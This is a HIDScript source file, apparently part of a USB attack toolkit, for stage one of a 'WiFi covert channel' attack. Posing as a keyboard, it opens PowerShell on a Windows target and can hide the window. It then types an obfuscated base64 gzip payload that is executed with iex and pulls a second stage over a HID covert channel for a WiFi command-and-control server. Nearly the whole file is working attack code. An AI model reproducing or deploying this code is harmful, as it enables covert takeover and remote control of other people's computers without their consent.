/*
WiFi covert channel, initial stage (keystroke injection)
author: MaMe82

This isn't a stand-alone HIDScript. It is meant to be used as part of the Master Template "Wifi covert channel"
in order to met all the dependencies.

Two options could be changed in this script:
1) The keyboard language to type out the initial stage
2) The hide option. If disabled the powershell window on the target host isn't hidden, to allow
easy debugging.

Dependencies:
	- this HIDScript is started as part of the TriggerActions named "wifi_covert_channel"
    and triggered as soon as a new USB to host connection is detected
    - the script runs stage1 (keystroke injection), stage 2 is delivered via a HID covert channel
    - to make the HID covert channel work:
    	a) the USB gadget needs to have 'Custom HID device' enabled in addition to keyboard
        b) the HID covert channel stager (hidstager.py) has to be started and ready to serve
        the stage2 PowerShell script
    - condition a) is assured by an USB gadget template, called 'wifi_covert_channel'
    - condition b) gets satisfied by a bash script (wifi_covert_channel.sh) bashscript, which 
    starts the stager and additionally the "WiFi covert channel C2 server"
    - the aforementioned bash script is started by a second trigger action, which is part
    TriggerAction templated named "wifi_covert_channel", too
    - so two conditions are assured by TriggerActions (starting HID stager+WiFi covert channel server
    and running this HIDScript against the target host), but the remaining condition (deploy proper USB
    gadget settings, once) has to be met, too.
    - To tie everything together, the TriggerAction template and the USB gadget settings have been wrapped
    together into a Master Template called 'wifi covert channel', which could be load on startup or on demand.
    
Controlling the server:
   - The WiFi covert channel server is bound to a screen session called 'wifi_c2' and could attached
   to a SSH session by running:
      $ screen -d -r wifi_c2
*/

language="us";
hide=false; // set to true to hide the console window on the target

// Hide an already opened PowerShell console, but keep input focus, to go on typing
function hidePS() {
	type('$h=(Get-Process -Id $pid).MainWindowHandle;$ios=[Runtime.InteropServices.HandleRef];$hw=New-Object $ios (1,$h);$i=New-Object $ios(2,0);(([reflection.assembly]::LoadWithPartialName("WindowsBase")).GetType("MS.Win32.UnsafeNativeMethods"))::SetWindowPos($hw,$i,0,0,100,100,16512)')
  	press("ENTER");
}

// On a powershell prompt, check if the running PS is 32bit, start an inline 32bit PowerShell, otherwise.
function assurePS32() {
  type("if ([IntPtr]::Size -ne 4){& $env:SystemRoot\\SysWOW64\\WindowsPowerShell\\v1.0\\powershell.exe}\n");
  delay(500);
}


// See helper.js for details
function hidDownAndIEX(vid, pid) {
  type("$USB_VID='"+ vid +"';$USB_PID='" + pid +"';");
  type("$b='H4sIAAAAAAAEAKVXbU/bSBD+jsR/sFzfxRGJ5VBaISR0Bwm0kUobNXA9XbDQxh4ne9jeaL1OG/X47zezu7YT2lSqCoLYuzPPPPO6m8ODtCpixUXhfIQ0g1gNJTAF1zyDG1BLkfjdw4OvhwdeInLn3JldrFYjkTNeRGdnw0pKKJR5JxGGEu/hc//D/F9EqhERPLgoS8jn2eY9y8F3b9gNnB6PNkW97KIRj81RnewEI0h5AbjPch7XMj7i95zZFuhVzlWDfFnxLAF5EcdQlkjuY1UQaK5B2XwX80YkVbZNxCy4Pce7ZlkJpKm0Zl5r3m5WjQLKuZNqnvG45wwzVpaaf5xShFDPatj4uW1E3V3+RuBCKcnnlYIyalGniikek/y4UBMlI3wiBrMocv70Z1NUKRaR2X55TA93zVOrcbd/1+lqygmnpGKsFM8hwD2QYjUFueYYxmCUZeN8JaRqOEbBG1BDUZRKVrES0m/JGMCUacDWyWsOWTIuUmGp/6Qtre67V4WSm4nghXK7vZ8mbEEmEkqUhClf/ALKFNQ7VqorKYX8BZghyzIMG8ZyjT2EkfoVrCWTSMu1KUjXOgmmC03Yd4vQu5UVNB97jX5DEdvqEy/Yiv9IyXBB0YtKCUMo3j8YdA8Pq1KJvHHNtrJP5dkj8o8gC8heHgdJllGYqMz0f/TUdl6ANp/B+NqyaeXA+K+bGFeeDtu510YGCxlYfi1FPgJyZsLU0vfyPM7QX1vljrfCVTsTl3pC4D7OwgbF1xJNa4Z/D0PzQ0sfAhJphxSw5JPkCtrGPDv7B+PZyuJkAlz8sIKi7ePwy8kW6LaiHqREixhcCpEBK6KQYnQ+u+GxFKVIVYBZxGhOWQpvWZFkmDZ6JnPm/Xmbl353Fka1xzEmfS0e0VMd3ZSd73eM6JwTGY9SZmPy+mSL3MCQswgmB9+zPzhBAhJUJYvnFLbTWUKRPCRMMd9LEQ8Nl6KSMT0kUCr6wE38kBADX0Nic8nPKUrzDc7h3WK9xKVZ5PivX3VrgZnHj44i6jF6jZxw34a1vXebGO3fRJ7BOygWarlXpnZCn74oPhSrza3wjTQ6yYlzAmsKRaAT0uxh6ZhHa+NZHDEN23G0UZI/ik0s9QFurVEJ+J7shT2zawIsgabYA09IVBp/cLmU8e5CUqpnEsUzFRmvdxfycvF9dqSLDGYXUrIN3VswSMQMw4N/qGaCYaTqCkNGVCu6YnCHCiZeG/HdQGGlbo+Lu+nlw1/jEUrS02Q8spF7Ox69qXhy7n49SQbw6tX8uJ8OXqf9wSBO+6en8bwfhgP8oaZ+GT65aEFgDuIl8v+cc4yqwwtngY+O7t4HhMcOUVJkGUjDwPnvt68zlIh87wEvITgyEhzc3Sen6yAFnjZQgZEfj5x+zhTZcGvirnPkdH5H3g8dfHJrL9yu08fR4OwF6KCDHSvUL4RqJO3JoClQcdB0xDy59/d/3JOxWm7yflKDYu2sMhaD37nv9DovEBaZvNDCNow6BU8toHmhUYzQe26yKECi57sZc2rHm4S1HYNYPz4dzPQ3ZwI1gMBDEZX6NNNKxRZwTJ5iLj3IV2rz/fIMsULwdqPL5POSzPpNE+2OZQwsOF5RZZkpqmbWNV3nhPhrjYXa4fgRiFLTzo2oLQgjgdNdg4cGOMbC4kUFOqzbYoP9Yl6l0lMaTbfwRQVXRSwSOjDPzu5ur09pnpsTtIE6iboWmxQDvPFKVX7i2EMuubUEfJ9j8OvK8214+wuF9g2BObr12JL8BmgOC15sQ9lmrBOFIZrRMYMnEd1taD6+w5s7XvIIxDHTFUk7JpmumZGA3xC0vZpQE5A66Uc4mIhMYwoXBt/a8t3AQj7tI2IB0U/zPQcS0uDwxbG2zDDCW1mWbew3NVs7w0yU+rbTrIx4ubJrqHR48D9inn4F/g0AAA==';nal no New-Object -F;iex (no IO.StreamReader(no IO.Compression.GZipStream((no IO.MemoryStream -A @(,[Convert]::FromBase64String($b))),[IO.Compression.CompressionMode]::Decompress))).ReadToEnd()");
  press("ENTER");
}

layout(language); //set keyboard layout according to the language variable (if this command is ommited, the current layout is used)
typingSpeed(0,0); // type as fast as possible

// The script is started, as soon as a USB  host connection is detected.
// A connection doesn't necessarily mean the remote host has the HID keyboard driver up already.
// To account for this, we wait for a keyboard report (no matter if it results in 'ANY_OR_NONE' LED state change
// we are only interested in an arriving LED report, which is sent by windows after keyboard driver initialization).
// After 5 seconds of waiting, we go on in any case.
waitLED(ANY_OR_NONE, 5000); 

// start an unprivileged PowerShell console
press("GUI r");
delay(500);
type("powershell\n");
delay(500);

if (hide) { hidePS(); } //hide the console if choosen to do so
delay(500);
assurePS32(); // open a 32bit console, if the current one is 64bit
delay(500);
hidDownAndIEX("1D6B", "1315");